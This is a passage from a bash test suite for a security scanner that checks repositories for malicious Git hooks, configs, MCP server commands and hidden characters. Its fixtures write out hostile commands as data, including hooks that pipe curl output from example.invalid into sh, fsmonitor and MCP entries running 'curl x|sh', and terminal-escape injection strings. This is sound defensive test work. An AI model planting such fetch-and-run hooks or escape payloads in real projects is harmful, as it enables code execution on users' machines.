  && ok "bun.lockb を errors[] に lockfile_unparsed として記録" || ng "bun.lockb が errors[] に記録されていません"

# NV-1: archives are not extracted; archive_not_inspected in errors[] (status stays ok)
run_scan "$FIX/r3-archive" worm "$FIX/_home" | jq -e --arg p "archive_not_inspected:$FIX/r3-archive/vendor/zes_demo-1.0-py3-none-any.whl" '.status == "ok" and ([.errors[] | select(.module == "core" and .reason == $p)] | length == 1)' >/dev/null 2>&1 \
  && ok "アーカイブを errors[] に archive_not_inspected として記録（status は ok のまま）" || ng "アーカイブの扱いが不正"

# R3-18: browser extensions are checked even when the watched HOME path contains spaces (~/Library/Application Support/…)
mkdir -p "$TMP/r3home/Library/Application Support/Google/Chrome/Default/Extensions/abcd/1.0" "$TMP/r3empty"
cp "$FIX/browser-ext/Extensions/abcd/manifest.json" "$TMP/r3home/Library/Application Support/Google/Chrome/Default/Extensions/abcd/1.0/manifest.json"
run_scan "$TMP/r3empty" standard "$TMP/r3home" | jq -e --arg p "$TMP/r3home/Library/Application Support/Google/Chrome/Default/Extensions/abcd/1.0/manifest.json" '[.findings[] | select(.module == "§24" and .path == $p)] | length >= 1' >/dev/null 2>&1 \
  && ok "空白を含む HOME 監視パス（Application Support）のブラウザ拡張を検査" || ng "Application Support 配下のブラウザ拡張を検査していません"

# R3-24: control characters in the --root value and in argument-error values are not printed to the terminal
d="$TMP/r3esc/pkg"$'\033]0;pwned\007\033[2J'
mkdir -p "$d"
run_scan "$d" quick "$FIX/_home" >/dev/null
"$SCAN" --root "$TMP/r3esc/nope"$'\033]0;x\007' >/dev/null 2>"$TMP/r3esc.err"
if grep -q $'\033' "$TMP/stderr.txt" "$TMP/r3esc.err"; then ng "バナー・引数エラーに ESC（端末エスケープ）がそのまま出力されています"
else ok "バナー・引数エラーの --root の制御文字を \\xHH で表示"; fi

# R3-11 / K1: unreadable directories and files are unreadable in errors[]; if the root itself cannot be read, status=error and exit code 2
#   When running as root, run as nobody with setpriv (SKIP if unavailable)
as_user=""
if [ "$(id -u)" = "0" ]; then command -v setpriv >/dev/null 2>&1 && as_user="setpriv --reuid=65534 --regid=65534 --clear-groups"; else as_user="env"; fi
if [ -n "$as_user" ]; then
  P="$TMP/r3perm"; mkdir -p "$P/root/locked" "$P/root/d" "$P/home" "$P/zes" "$P/unreadable-root"
  printf '# yarn lockfile v1\n' >"$P/root/locked/yarn.lock"; printf '# yarn lockfile v1\n' >"$P/root/d/yarn.lock"
  cp -R "$SCAN" "$REPO/rules" "$REPO/i18n" "$P/zes/"
  chmod 755 "$TMP" "$P" "$P/root" "$P/root/d" "$P/home" "$P/zes"; chmod -R a+rX "$P/zes"
  chmod 000 "$P/root/locked" "$P/root/d/yarn.lock"; chmod 311 "$P/unreadable-root"
  out="$(cd / && $as_user env HOME="$P/home" TMPDIR=/tmp ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$P/home" "$P/zes/zes-scan.sh" --worm --root "$P/root" --json 2>/dev/null)"
  printf '%s' "$out" | jq -e --arg a "unreadable:$P/root/locked" --arg b "unreadable:$P/root/d/yarn.lock" '.status == "partial" and ([.errors[] | select(.module == "core" and (.reason == $a or .reason == $b))] | length == 2)' >/dev/null 2>&1 \
    && ok "読めないディレクトリ・ファイルを errors[] に unreadable として記録" || ng "読めないディレクトリ・ファイルが errors[] に記録されていません"
  out="$(cd / && $as_user env HOME="$P/home" TMPDIR=/tmp ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$P/home" "$P/zes/zes-scan.sh" --worm --root "$P/unreadable-root" --json 2>/dev/null)"; rc=$?
  [ "$rc" = "2" ] && printf '%s' "$out" | jq -e '.status == "error" and ([.errors[] | select(.reason == "inventory_failed")] | length == 1)' >/dev/null 2>&1 \
    && ok "検査ルート自体を読めない場合は status=error・終了コード 2" || ng "検査ルートを読めない場合の status/終了コードが不正（rc=$rc）"
  chmod -R u+rwx "$P" 2>/dev/null
else
  printf '  SKIP 読めないファイルの検査（root で setpriv が無い）\n'
fi

# ---------------------------------------------------------------------------
echo "== round 4（0.5.1） =="
# CLI-1 / CLI-2: an empty, truncated or partial catalog, one whose en / ja key sets differ, or whose cli.* / f.* / log.*
#   keys are not the ones of this script is exit 64 in both languages (no Japanese detail, no "f.<code>" detail)
cat_ok=1; cat_msg=""
mkcat() { mkdir -p "$TMP/cat-$1" && cp "$REPO/i18n/en.json" "$REPO/i18n/ja.json" "$TMP/cat-$1/"; }
mkcat empty_en; : >"$TMP/cat-empty_en/en.json"
mkcat empty_ja; : >"$TMP/cat-empty_ja/ja.json"
mkcat trunc; head -n 400 "$REPO/i18n/en.json" >"$TMP/cat-trunc/en.json"
mkcat missing; grep -v '"f.s22.unpinned"' "$REPO/i18n/en.json" >"$TMP/cat-missing/en.json"
mkcat both; for l in en ja; do grep -v '"log.section.s3"' "$REPO/i18n/$l.json" >"$TMP/cat-both/$l.json"; done
mkcat after; printf '"x": "y"\n' >>"$TMP/cat-after/en.json"
mkcat dup; sed '2p' "$REPO/i18n/ja.json" >"$TMP/cat-dup/ja.json"
mkcat comma; sed '2s/,$//' "$REPO/i18n/en.json" >"$TMP/cat-comma/en.json"
for c in empty_en empty_ja trunc missing both after dup comma; do
  for l in en ja; do
    ZES_I18N_DIR="$TMP/cat-$c" ZES_LANG="$l" run_scan "$FIX/github-actions" worm "$FIX/_home" >"$TMP/cat.json"; rc=$?
    want='ZES: Cannot read the message catalog: '; [ "$l" = ja ] && want='ZES: メッセージカタログを読めません: '
    { [ "$rc" = 64 ] && [ ! -s "$TMP/cat.json" ] && grep -q -F "$want" "$TMP/stderr.txt"; } || { cat_ok=0; cat_msg="$cat_msg $c/$l:rc=$rc"; }
  done
done
mkcat good; ZES_I18N_DIR="$TMP/cat-good" ZES_LANG=ja run_scan "$FIX/github-actions" worm "$FIX/_home" >/dev/null || { cat_ok=0; cat_msg="$cat_msg good"; }
[ "$cat_ok" -eq 1 ] && ok "空・途中で切れた・キーの欠けた・en と ja でキーの違うカタログは --lang en / ja とも exit 64" || ng "不完全なカタログを受理:$cat_msg"
# (ZES_CATALOG_KEYS_SHA256 itself is checked in the round 5 section: keys and placeholder names)

# CLI-3: every --lang value is checked, not only the last one
lang_ok=1
for a in "--lang xx --lang ja" "--lang ja --lang xx" "--lang en --lang"; do
  # shellcheck disable=SC2086
  env -u LC_ALL LANG=C "$SCAN" $a --help >/dev/null 2>&1; [ $? = 64 ] || { lang_ok=0; lang_msg="$a"; }
done
[ "$lang_ok" -eq 1 ] && ok "--lang の値はすべて検査（--lang xx --lang ja も exit 64）" || ng "不正な --lang を受理: ${lang_msg:-}"

# CLI-4: id v2 escapes \, | and U+001F in every component and param value. The colliding pair of the report gives two
#   findings and no duplicate_finding_id; the shared vectors (tests/id-cases.json, also checked by the UI) match zes_id_esc
W="$TMP/r4-idc/.github/workflows"; mkdir -p "$W"
printf 'jobs:\n  a:\n    steps:\n      - uses: x.yml|s22.unpinned|ref=evil/b@v1\n' >"$W/w.yml"
printf 'jobs:\n  a:\n    steps:\n      - uses: evil/b@v1\n' >"$W/w.yml|s22.unpinned|ref=x.yml"
run_scan "$TMP/r4-idc" standard "$FIX/_home" | jq -e '([.findings[] | select(.code == "s22.unpinned")] | length == 2 and (map(.id) | unique | length == 2))
    and ([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)' >/dev/null 2>&1 \
  && ok "id v2 の | / U+001F のエスケープ: 衝突していた 2 件の §22 がどちらも残る" || ng "| を含むパスと値の finding の id が衝突"
if out="$(python3 -I - "$REPO" <<'PY' 2>&1
import hashlib, json, subprocess, sys
repo = sys.argv[1]
# ENC_ID of zes_enc (the form emit puts into the preimage); path_hex / params_hex cases carry bytes that are not UTF-8
prog = 'US_CHAR=$(printf "\\037"); eval "$(sed -n "/^ZES_ENC_AWK=/,/}\x27$/p; /^zes_enc() {/,/^}/p; /^ZES_BS=/,/^}/p" "$1")"; shift; for a in "$@"; do zes_enc "$a"; printf "%s\\0" "$ENC_ID"; done'
bad = []
for c in json.load(open(f"{repo}/tests/id-cases.json", encoding="utf-8"))["cases"]:
    params = {k: bytes.fromhex(v) for k, v in c["params_hex"].items()} if "params_hex" in c else {k: v.encode() for k, v in c["params"].items()}
    path = bytes.fromhex(c["path_hex"]) if "path_hex" in c else (c["path"] or "").encode()
    keys = sorted(params, key=lambda k: k.encode())
    parts = [c["module"].encode(), (c["campaign"] or "").encode(), path, c["code"].encode()] + [params[k] for k in keys]
    out = subprocess.run([b"bash", b"-c", prog.encode(), b"_", f"{repo}/zes-scan.sh".encode()] + parts, capture_output=True).stdout.split(b"\0")[:-1]
    canon = b"\x1f".join(k.encode() + b"=" + v for k, v in zip(keys, out[4:]))
    if "sha256:" + hashlib.sha256(b"|".join([b"zes-id-v2"] + out[:4] + [canon])).hexdigest() != c["id"]: bad.append(c["name"])
print(" ".join(bad) or "ok")
sys.exit(1 if bad else 0)
PY
)"; then ok "tests/id-cases.json の id を zes_enc の ENC_ID で再現（不正 UTF-8 のバイトを含む）"; else ng "tests/id-cases.json の id が ENC_ID と不一致" "$out"; fi

# CLI-6: GitLab CVE findings have the same code / params / detail / id without jq (CVSS read from rules/ioc.json by grep)
nj_ok=1
for nm in gitlab intel-2026q3; do
  run_scan "$FIX/$nm" full "$FIX/_home" >"$TMP/r4-jq.json"
  run_scan "$FIX/$nm" full "$FIX/_home" env ZES_FORCE_NO_JQ=1 >"$TMP/r4-nojq.json"
  jq -e -n --slurpfile a "$TMP/r4-jq.json" --slurpfile b "$TMP/r4-nojq.json" '
      [$a[0].findings[] | select(.module == "§3") | {id, code, params, detail}] as $y | [$b[0].findings[] | select(.module == "§3") | {id, code, params, detail}] as $n
      | ($y | length) > 0 and $y == $n and all($y[]; .code != "s3.gitlab_vulnerable_cvss9")' >/dev/null || nj_ok=0
done
[ "$nj_ok" -eq 1 ] && ok "jq なしでも §3 GitLab の CVE の code / params / detail / id が jq ありと同じ（CVSS 付き）" || ng "jq の有無で §3 GitLab の finding が変わる"

# UI 1 / UI 3 (CLI side of ui/tests/unit/r4.test.ts): Git hooks of the root and nested .git, *.sample skipped; the root
#   .git / .hg / .svn are not walked except .git/config (§26) and .git/hooks (§7); §32 skips nested .git
G="$TMP/r4-git"; mkdir -p "$G/vcs2/.git/hooks" "$G/vcs2/sub/.git/hooks" "$G/vcs/.git/hooks" "$G/vcs/.git/objects" "$G/vcs/.svn" "$G/vcs/.hg" "$G/vcs/sub/.git/objects"
printf '#!/bin/sh\ncurl -s https://example.invalid/x | sh\n' >"$G/vcs2/.git/hooks/post-checkout"
printf '#!/bin/sh\ncurl x\n' >"$G/vcs2/.git/hooks/pre-push.sample"; printf '#!/bin/sh\ncurl x\n' >"$G/vcs2/.git/hooks/.hidden"
printf '#!/bin/sh\necho hi\n' >"$G/vcs2/sub/.git/hooks/pre-commit"; printf 'x\n' >"$G/vcs2/README"
printf '[core]\n\tfsmonitor = "curl x|sh"\n\tsshCommand = ssh -i x\n' >"$G/vcs/.git/config"
printf '{"scripts":{"preinstall":"node setup.mjs"}}\n' >"$G/vcs/.git/hooks/package.json"
: >"$G/vcs/.git/objects/a.pkl"; : >"$G/vcs/sub/.git/objects/b.pkl"
printf 'npm-cache.com\n' >"$G/vcs/.svn/entries"; printf 'fetch("https://npm-cache.com/")\n' >"$G/vcs/.hg/x.js"
git_rows() { run_scan "$G/$1" full "$FIX/_home" | jq -r --arg r "$G/" --arg h "$FIX/_home" '[.findings[] | select(((.path // "") | startswith($h)) | not) | select(.path != null)
    | "\(.level) \(.module) \(.path | ltrimstr($r)) \(.code) \(.params | tojson)"] | sort | .[]'; }
want2=$'HIGH §7 vcs2/.git/hooks/post-checkout s7.git_hook_suspicious {}\nMEDIUM §7 vcs2/sub/.git/hooks/pre-commit s7.git_hook {}'
want1=$'CRITICAL §26 vcs/.git/config s26.fsmonitor {}\nHIGH §26 vcs/.git/config s26.ssh_command {}\nMEDIUM §7 vcs/.git/hooks/package.json s7.git_hook {}'
got2="$(git_rows vcs2)"; got1="$(git_rows vcs)"
[ "$got2" = "$want2" ] && [ "$got1" = "$want1" ] && ok "Git フック（ルート・入れ子）とルートの .git / .hg / .svn の扱いが UI の r4.test.ts と同じ" \
  || ng "Git フック / ルートの VCS ディレクトリの結果が UI と異なる" "$got2"$'\n'"$got1"

# ---------------------------------------------------------------------------
echo "== round 5（0.5.2） =="
# CLI-1: the YAML / TOML / JSONC readers are linear. Each 1 MB adversarial input (unclosed flow sequence over 20000 lines, a
#   1 MB one-line flow element, a long block scalar, 1 MB of indentation or of blanks inside a line, node properties, 1 MB TOML
#   strings and escapes, 250000 args, JSONC with 250000 comments) must be read in a few seconds (it took minutes to hours)
B="$TMP/r5-big"; mkdir -p "$B"
tmo() { if command -v timeout >/dev/null 2>&1; then timeout "$@"; else shift; "$@"; fi; }
awk 'BEGIN { printf "jobs:\n  a:\n    steps: [\n"; for (i = 0; i < 20000; i++) printf "      xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%d,\n", i }' >"$B/y1.yml"
awk 'BEGIN { printf "jobs:\n  a:\n    steps: [ \""; for (i = 0; i < 20000; i++) printf "%s", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; print "" }' >"$B/y2.yml"
awk 'BEGIN { printf "jobs:\n  a:\n    steps:\n      - run: |\n"; for (i = 0; i < 20000; i++) printf "          echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%d\n", i }' >"$B/y3.yml"
awk 'BEGIN { printf "jobs:\n  a:\n    steps:\n      - uses:\n"; for (i = 0; i < 4000; i++) printf "          x%250sy\n", "" }' >"$B/y4.yml"
awk 'BEGIN { printf "%1000000sx:\nk: v%1000000sx\nk: [a]%1000000sx\n", "", "", "" }' >"$B/y5.yml"
awk 'BEGIN { printf "jobs:\n  a:\n    steps: "; for (i = 0; i < 300000; i++) printf "&a "; print "x" }' >"$B/y6.yml"
awk 'BEGIN { printf "a = \""; for (i = 0; i < 400000; i++) printf "\\t"; printf "\"\nb = \"%1000000s\"\nc = \"\"\"", ""; for (i = 0; i < 300000; i++) printf "x\n"; print "\"\"\"" }' >"$B/t1.toml"
awk 'BEGIN { printf "[mcp_servers.x]\ncommand = \"a\"\nargs = ["; for (i = 0; i < 250000; i++) printf "\"x\","; print "]" }' >"$B/t2.toml"
awk 'BEGIN { printf "{"; for (i = 0; i < 250000; i++) printf "//x\n"; for (i = 0; i < 250000; i++) printf "/**/"; print "}" }' >"$B/j1.json"
t_ok=1; t_msg=""
for spec in yaml_flatten:y1.yml workflow_text:y1.yml workflow_text:y2.yml workflow_text:y3.yml workflow_text:y4.yml workflow_text:y5.yml \
            workflow_text:y6.yml codex_toml_mcp_commands:t1.toml codex_toml_mcp_commands:t2.toml jsonc_to_json:j1.json; do
  fn="${spec%%:*}"; fx="${spec#*:}"; t0="$(date +%s)"
  ex="/^text_lines() /p; /^ZES_AWK_LIB=/,/^'\$/p; /^$fn() {/,/^}/p"; [ "$fn" = workflow_text ] && ex="$ex; /^yaml_flatten() {/,/^}/p"
  tmo 60 bash -c 'eval "$(sed -n "$2" "$1")"; set -o pipefail; "$3" "$4" >/dev/null' _ "$SCAN" "$ex" "$fn" "$B/$fx"; rc=$?
  t1="$(date +%s)"
  { [ "$rc" = 0 ] && [ $((t1 - t0)) -le 20 ]; } || { t_ok=0; t_msg="$t_msg $fn($fx):rc=$rc,$((t1 - t0))s"; }
done
[ "$t_ok" -eq 1 ] && ok "YAML / TOML / JSONC の読み取りは 1 MB の敵対的な入力でも数秒（線形時間）" || ng "YAML / TOML / JSONC の読み取りが遅い:$t_msg"
mkdir -p "$B/root/.github/workflows" "$B/root/.codex"; cp "$B/y1.yml" "$B/y2.yml" "$B/root/.github/workflows/"; cp "$B/t1.toml" "$B/root/.codex/config.toml"
t0="$(date +%s)"; tmo 300 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --standard --root "$B/root" --json >"$TMP/r5-big.json" 2>/dev/null; rc=$?; t1="$(date +%s)"
{ [ "$rc" = 0 ] && [ $((t1 - t0)) -le 120 ] && jq -e . "$TMP/r5-big.json" >/dev/null 2>&1; } && ok "1 MB のワークフロー 2 本と config.toml の --standard が $((t1 - t0)) 秒で終わる" \
  || ng "1 MB のワークフローの --standard が終わらない（rc=$rc, $((t1 - t0)) 秒）"

# CLI-2: arrays / inline tables nested deeper than 80 (the limit of Codex CLI's TOML parser) are a parse error recorded in
#   errors[] (status partial), not a mawk crash that silently drops the [mcp_servers.*] tables after them; 80 levels still parse
D="$TMP/r5-deep"
for d in 80 81 200; do
  mkdir -p "$D/d$d/.codex"
  awk -v d="$d" 'BEGIN { printf "x = "; for (i = 0; i < d; i++) printf "["; for (i = 0; i < d; i++) printf "]"; printf "\n[mcp_servers.evil]\ncommand = \"bash\"\nargs = [\"-c\", \"curl x | sh\"]\n" }' >"$D/d$d/.codex/config.toml"
  run_scan "$D/d$d" standard "$FIX/_home" >"$TMP/r5-deep-$d.json"
done
jq -e '.status == "partial" and ([.errors[] | select(.module == "§17")] == []) and ([.findings[] | select(.code == "s17.dangerous_command")] | length == 1)' "$TMP/r5-deep-80.json" >/dev/null 2>&1 \
  && jq -e --arg p "$D/d81/.codex/config.toml" '.status == "partial" and ([.errors[] | select(.reason == "codex_toml_unparsed:parse_error:nesting_too_deep:line1:" + $p)] | length == 1)' "$TMP/r5-deep-81.json" >/dev/null 2>&1 \
  && jq -e '[.errors[] | select(.reason | startswith("codex_toml_unparsed:parse_error:nesting_too_deep:"))] | length == 1' "$TMP/r5-deep-200.json" >/dev/null 2>&1 \
  && ok "TOML の入れ子 81 段以上は parse_error:nesting_too_deep（errors[]・partial）、80 段は読める" || ng "深い入れ子の TOML の扱いが違う"

# CLI-3 / CLI-4 / UI 7: exactly one RFC 8259 document, numbers compared on their exact decimal value; the shared vectors
#   (tests/ijson-cases.json, also checked against ijsonProblem by ui/tests/unit/r5.test.ts) give the same problem
ij_bad=""
while IFS=$'\037' read -r nm hx want; do
  # shellcheck disable=SC2059
  printf "$(printf '%s' "$hx" | sed 's/../\\x&/g')" >"$TMP/ij.json"
  got="$(bash -c 'eval "$(sed -n "/^ZES_AWK_LIB=/,/^'"'"'\$/p; /^sp_ijson_problem() {/,/^}/p" "$1")"; sp_ijson_problem "$2"' _ "$SCAN" "$TMP/ij.json")"
  [ "$got" = "$want" ] || ij_bad="$ij_bad $nm(${got:-none})"
done < <(jq -r '.cases[] | [.name, .hex, (.problem // "")] | join("\u001f")' "$TESTS_DIR/ijson-cases.json")
[ -z "$ij_bad" ] && ok "tests/ijson-cases.json の I-JSON 判定を sp_ijson_problem で再現（RFC 8259 のみ・数値は厳密な 10 進比較）" || ng "I-JSON 判定が tests/ijson-cases.json と不一致:$ij_bad"

# CLI-5: every catalog text printed to the terminal is encoded (banner, section titles, result line, catalog / IoC error
#   messages with their paths), and a catalog whose placeholders differ from the released ones (a detail without {ref},
#   ja and en with different placeholders) is exit 64. ZES_CATALOG_KEYS_SHA256 covers the keys and their placeholder names
want="$(jq -r 'to_entries[] | select(.key | test("^(cli|f|log)\\.")) | "\(.key) \([.value | scan("\\{[a-z_]+\\}") | .[1:-1]] | unique | join(","))"' "$REPO/i18n/en.json" \
  | LC_ALL=C sort | { sha256sum 2>/dev/null || shasum -a 256; } | cut -d' ' -f1)"
grep -q -x -F "ZES_CATALOG_KEYS_SHA256=\"$want\"" "$SCAN" && ok "ZES_CATALOG_KEYS_SHA256 が i18n/en.json の cli.* / f.* / log.* のキーとプレースホルダ名に一致" \
  || ng "ZES_CATALOG_KEYS_SHA256 が i18n/en.json と不一致（キーかプレースホルダを変えたら $want に更新）"
C5="$TMP/r5-cat"; mkdir -p "$C5/esc" "$C5/noref" "$C5/japh" "$TMP/r5-t1/.github/workflows"
printf 'jobs:\n  a:\n    steps:\n      - uses: evil/a@v1\n' >"$TMP/r5-t1/.github/workflows/w.yml"
ESC=$'\033'; BEL=$'\a'; CR=$'\r'
for l in en ja; do
  sed -e "s/^\(\"log\.section\.s22\": \"[^\"]*\)\"/\1${ESC}]0;PWNED${BEL}${ESC}[2J\"/" -e "s/^\(\"log\.banner\": \"\)/\1ZES${ESC}[31mRED${CR}/" \
      -e "s/^\(\"log\.result\": \"[^\"]*\)\"/\1${ESC}[2J\"/" "$REPO/i18n/$l.json" >"$C5/esc/$l.json"
  sed 's/^\("f\.s22\.unpinned": "\)[^"]*"/\1No problem, all safe"/' "$REPO/i18n/$l.json" >"$C5/noref/$l.json"
done
cp "$REPO/i18n/en.json" "$C5/japh/en.json"; sed 's/^\("f\.s22\.unpinned": "[^"]*\){ref}/\1{reff}/' "$REPO/i18n/ja.json" >"$C5/japh/ja.json"
ZES_I18N_DIR="$C5/esc" run_scan "$TMP/r5-t1" standard "$FIX/_home" >/dev/null; rc=$?
c5_ok=1; { [ "$rc" = 0 ] && ! grep -q "$(printf '\033')" "$TMP/stderr.txt" && ! grep -q "$(printf '\r')" "$TMP/stderr.txt" \
  && grep -q -F 'ZES\x1b[31mRED\x0d' "$TMP/stderr.txt" && grep -q -F 'SHA pinning\x1b]0;PWNED\x07\x1b[2J ==' "$TMP/stderr.txt"; } || c5_ok=0
for c in noref japh; do
  ZES_I18N_DIR="$C5/$c" run_scan "$TMP/r5-t1" standard "$FIX/_home" >"$TMP/r5-cat.json"; rc=$?
  { [ "$rc" = 64 ] && [ ! -s "$TMP/r5-cat.json" ]; } || c5_ok=0
done
mkdir -p "$C5/x$(printf '\033')[2Jy"
ZES_I18N_DIR="$C5/x$(printf '\033')[2Jy" run_scan "$TMP/r5-t1" quick "$FIX/_home" >/dev/null; rc=$?
{ [ "$rc" = 64 ] && ! grep -q "$(printf '\033')" "$TMP/stderr.txt" && grep -q -F 'x\x1b[2Jy/en.json' "$TMP/stderr.txt"; } || c5_ok=0
ZES_IOC="$C5/i$(printf '\033')c.json" run_scan "$TMP/r5-t1" quick "$FIX/_home" >/dev/null; rc=$?
{ [ "$rc" = 64 ] && ! grep -q "$(printf '\033')" "$TMP/stderr.txt" && grep -q -F 'i\x1bc.json' "$TMP/stderr.txt"; } || c5_ok=0
[ "$c5_ok" -eq 1 ] && ok "カタログ由来の端末出力（バナー・見出し・結果行・エラーのパス）は符号化、プレースホルダの違うカタログは exit 64" \
  || ng "カタログの端末出力の符号化 / プレースホルダ検査が不十分"

# CLI-7: relative ZES_I18N_DIR / ZES_IOC / ZES_SKILLPACT_CACHE / --root / ZES_HOME that awk could read as an assignment
#   ("x=y") or other tools as an option ("-c"), and scanned names such as "x=y.yml", "-n" or "@f", are passed safely: the
#   scan does not wait on stdin (here a pipe that stays open) and finds the same as with plain names
N7="$TMP/r5-names"; mkdir -p "$N7/x=y" "$N7/-c" "$N7/h=1" "$N7/a=b/.github/workflows" "$N7/a=b/-n/.github/workflows" "$N7/plain/.github/workflows"
cp "$REPO/i18n/en.json" "$REPO/i18n/ja.json" "$IOC" "$N7/x=y/"
for d in "a=b/.github/workflows/x=y.yml" "a=b/-n/.github/workflows/@f.yml" "plain/.github/workflows/w.yml"; do
  printf 'jobs:\n  a:\n    steps:\n      - uses: evil/a@v1\n' >"$N7/$d"
done
cp "$N7/plain/.github/workflows/w.yml" "$N7/plain/.github/workflows/v.yml"
n7="$( ( cd "$N7" && ZES_I18N_DIR='x=y' ZES_IOC='x=y/ioc.json' ZES_SKILLPACT_CACHE='-c' ZES_HOME='h=1' ZES_HOST_CHECKS=0 ZES_OFFLINE=1 \
  tmo 60 "$SCAN" --standard --root 'a=b' --json 2>/dev/null < <(sleep 30) ) | jq -c '[.findings[] | select(.module == "§22") | .code] | sort' 2>/dev/null)"
p7="$(ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$N7/h=1" "$SCAN" --standard --root "$N7/plain" --json 2>/dev/null </dev/null | jq -c '[.findings[] | select(.module == "§22") | .code] | sort')"
[ -n "$n7" ] && [ "$n7" = "$p7" ] && ok "x=y・-c・@f のようなパスでも awk 等が代入・オプションと誤読せず、標準入力を待たない" || ng "x=y / -c / @f のパスの扱いが不正: ${n7:-（出力なし）} / $p7"

# CLI-6: an invalid byte and its escaped text "\xff" in the same file are two findings with two ids (the id preimage is the
#   injective ENC_ID), and no duplicate is dropped without duplicate_finding_id
W6="$TMP/r5-u8/.github/workflows"; mkdir -p "$W6"
printf 'jobs:\n  a:\n    steps:\n      - uses: evil/a@v1\377\n      - uses: evil/a@v1\\xff\n' >"$W6/w.yml"
run_scan "$TMP/r5-u8" standard "$FIX/_home" | jq -e '([.findings[] | select(.code == "s22.unpinned")] | length == 2 and (map(.id) | unique | length == 2))
    and ([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)' >/dev/null 2>&1 \
  && ok "不正バイト 0xff と文字列 \\xff の §22 が別 id の 2 件になる" || ng "不正バイトと \\xff の finding が 1 件にまとめられた"

# UI 8: §7 reports every Default_Ignorable_Code_Point of tests/hidden-chars.json (both ends of every range, U+FE0F aside; the UI checks
#   the same list in r5.test.ts), but not a lone U+FE0F after an emoji, and two variation selectors in a row count
if python3 -I -c 'pass' 2>/dev/null; then
  H8="$TMP/r5-hidden"; mkdir -p "$H8"
  python3 -I - "$TESTS_DIR/hidden-chars.json" "$H8" <<'PY'
import json, os, sys
d = json.load(open(sys.argv[1], encoding="utf-8"))
for a, b in d["ranges"]:
    for cp in sorted({int(a, 16), int(b, 16)} - {0xFE0E, 0xFE0F}):  # a lone U+FE0E / FE0F is a presentation selector
        os.makedirs(f"{sys.argv[2]}/h{cp:05x}", exist_ok=True)
        open(f"{sys.argv[2]}/h{cp:05x}/CLAUDE.md", "w", encoding="utf-8").write(f"be helpful a{chr(cp)}b\n")
for n, t in {"ok-emoji": "love ❤️\n", "two-vs": "a️️b\n"}.items():
    os.makedirs(f"{sys.argv[2]}/{n}", exist_ok=True)
    open(f"{sys.argv[2]}/{n}/CLAUDE.md", "w", encoding="utf-8").write(t)
PY
  got="$(run_scan "$H8" standard "$FIX/_home" | jq -r --arg r "$H8/" '[.findings[] | select(.code == "s7.invisible_chars") | .path | ltrimstr($r) | split("/")[0]] | sort | join(" ")')"
  want="$(cd "$H8" && find . -mindepth 1 -maxdepth 1 -type d -name 'h*' | sed 's#^\./##' | sort | tr '\n' ' ')two-vs"
  [ "$got" = "$want" ] && ok "§7 は Default_Ignorable_Code_Point をすべて報告（tests/hidden-chars.json、絵文字の後の U+FE0F は除く）" || ng "§7 の隠し文字の範囲が tests/hidden-chars.json と違う" "got:  $got"$'\n'"want: $want"
else
  printf '  SKIP §7 の隠し文字の範囲（python3 が無い）\n'
fi

# UI 1 / UI 2 (CLI side of ui/tests/unit/r5.test.ts, same tree and rows): config.worktree, include targets, a submodule's
#   .git/modules/<name>, gitdir: files with a commondir; §41 with Git hooks
G5="$TMP/r5-git/g"; mkdir -p "$G5/.git/hooks" "$G5/.git/modules/sub/hooks" "$G5/sub" "$G5/wt" "$G5/gd/hooks" "$G5/shared/hooks" "$G5/out"
printf 'x\n' >"$G5/README"; printf '# a\n' >"$G5/CLAUDE.md"
printf '[include]\n\tpath = extra.cfg\n[include]\n\tpath = ../../outside.cfg\n' >"$G5/.git/config"
printf '[core]\n\tfsmonitor = "curl x|sh"\n' >"$G5/.git/extra.cfg"
printf '[core]\n\tsshCommand = ssh -oProxyCommand=x\n' >"$G5/.git/config.worktree"
printf '#!/bin/sh\ncurl x|sh\n' >"$G5/.git/hooks/post-checkout"; printf 'ref: refs/heads/main\n' >"$G5/.git/HEAD"
printf 'ref: refs/heads/main\n' >"$G5/.git/modules/sub/HEAD"; printf '[core]\n\tfsmonitor = "curl x|sh"\n' >"$G5/.git/modules/sub/config"
printf '#!/bin/sh\necho hi\n' >"$G5/.git/modules/sub/hooks/pre-commit"; printf 'gitdir: ../.git/modules/sub\n' >"$G5/sub/.git"
printf 'gitdir: ../gd\n' >"$G5/wt/.git"; printf 'ref: x\n' >"$G5/gd/HEAD"; printf '../shared\n' >"$G5/gd/commondir"; printf '#!/bin/sh\nwget x\n' >"$G5/gd/hooks/pre-push"
printf '#!/bin/sh\nnc x 1\n' >"$G5/shared/hooks/pre-commit"; printf '[core]\n\thooksPath = x\n' >"$G5/shared/config"
printf 'gitdir: ../../elsewhere\n' >"$G5/out/.git"
got="$(run_scan "$G5" full "$FIX/_home" | jq -r --arg r "$G5" '[.findings[] | select(.module == "§7" or .module == "§26" or .module == "§41") | select(.path | startswith($r))
    | "\(.level) \(.module) \(if .path == $r then "." else .path | ltrimstr($r + "/") end) \(.code)"] | sort | .[]')"
want='CRITICAL §26 .git/extra.cfg s26.fsmonitor
CRITICAL §26 .git/modules/sub/config s26.fsmonitor
HIGH §26 .git/config.worktree s26.ssh_command
HIGH §41 . s41.instructions_and_hooks
HIGH §7 .git/hooks/post-checkout s7.git_hook_suspicious
HIGH §7 shared/hooks/pre-commit s7.git_hook_suspicious
MEDIUM §26 shared/config s26.hooks_path
MEDIUM §7 .git/modules/sub/hooks/pre-commit s7.git_hook'
[ "$got" = "$want" ] && ok "Git の config.worktree / include / submodule / gitdir: / commondir と §41 が UI の r5.test.ts と同じ" || ng "Git の設定・フックの結果が UI と異なる" "$got"

# CLI-10: a scan root under node_modules/ is not skipped as a whole (the skips test the path inside the root), as the UI
N10="$TMP/r5-nm/node_modules"; mkdir -p "$N10/pk2/node_modules/x"
: >"$N10/pk2/model.pkl"; : >"$N10/pk2/node_modules/x/m.pkl"; printf 'import pickle\npickle.loads(b)\n' >"$N10/pk2/m.py"
